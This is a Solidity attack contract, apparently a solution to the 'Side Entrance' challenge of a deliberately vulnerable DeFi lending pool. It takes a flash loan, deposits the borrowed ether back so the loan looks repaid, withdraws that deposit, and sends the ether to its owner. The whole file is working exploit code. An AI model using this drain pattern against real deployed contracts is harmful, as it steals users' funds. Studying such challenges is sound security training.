pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";

contract SideEntranceAttack is IFlashLoanEtherReceiver {

	address payable owner;
	constructor(address payable _owner){

		owner = _owner;
	}
	function attack(address poolAddress, uint amount) external{

		SideEntranceLenderPool pool = SideEntranceLenderPool(poolAddress);

		pool.flashLoan(amount);

		pool.withdraw();

	}

	function execute() override external payable {

		SideEntranceLenderPool pool = SideEntranceLenderPool(msg.sender);
		pool.deposit{value: msg.value}();	
        }

	fallback() external payable {

		owner.call{value: msg.value}("");
	}
}